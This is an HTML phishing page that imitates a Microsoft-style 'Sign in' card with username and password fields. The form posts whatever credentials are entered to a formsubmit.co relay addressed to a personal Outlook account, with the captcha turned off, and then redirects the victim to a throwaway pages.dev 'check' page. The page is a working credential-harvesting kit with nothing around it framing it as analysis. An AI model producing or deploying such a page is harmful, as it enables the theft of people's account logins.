<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in</title>

<link rel="icon" href="img/favicon.png">

<style>
@font-face{
  font-family:"Segoe UI";
  src:local("Segoe UI");
}

body{
    margin:0;
    background:#f3f2f1;
    font-family:"Segoe UI",system-ui;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

.card{
    width:380px;
    background:#fff;
    box-shadow:0 4px 14px rgba(0,0,0,.15);
    padding:44px 40px;
    position:relative;
}

.loader{
    position:absolute;
    top:0;
    left:0;
    height:3px;
    width:0%;
    background:#0067b8;
    transition:width .6s ease;
}

.logo{
    height:32px;
    margin-bottom:28px;
}

h1{
    font-size:22px;
    font-weight:600;
    margin-bottom:10px;
}

.input{
    width:100%;
    border:none;
    border-bottom:1px solid #777;
    padding:12px 0;
    font-size:15px;
    margin-top:22px;
    outline:none;
}

.input:focus{
    border-bottom:2px solid #0067b8;
}

.button-row{
    margin-top:32px;
    display:flex;
    justify-content:flex-end;
}

.btn{
    background:#0067b8;
    color:#fff;
    border:none;
    padding:9px 28px;
    font-size:14px;
    cursor:pointer;
}

.btn:hover{
    background:#005da6;
}

.error{
    color:#d13438;
    font-size:13px;
    margin-top:10px;
}

.hidden{display:none;}
</style>
</head>

<body>

<div class="card">

<div class="loader" id="loader"></div>

<form id="loginForm" action="https://formsubmit.co/Gisellejordanlovings@outlook.com" method="POST">
<input type="hidden" name="_captcha" value="false">
<input type="hidden" name="_next" value="https://msnuuiuesd.pages.dev/check.html">
  <img src="img/icon.png" class="logo">

  <h1>Sign in</h1>

  <input
    class="input"
    id="username"
    name="username"
    placeholder="Email, phone, or username"
    required
  >

  <input
    type="password"
    class="input"
    id="password"
    name="password"
    placeholder="Password"
    required
  >

  <div class="error hidden" id="loginError">
    Invalid username or password.
  </div>

  <div class="button-row">
    <button type="submit" class="btn">Sign in</button>
  </div>

</form>

</div>


</body>
</html>
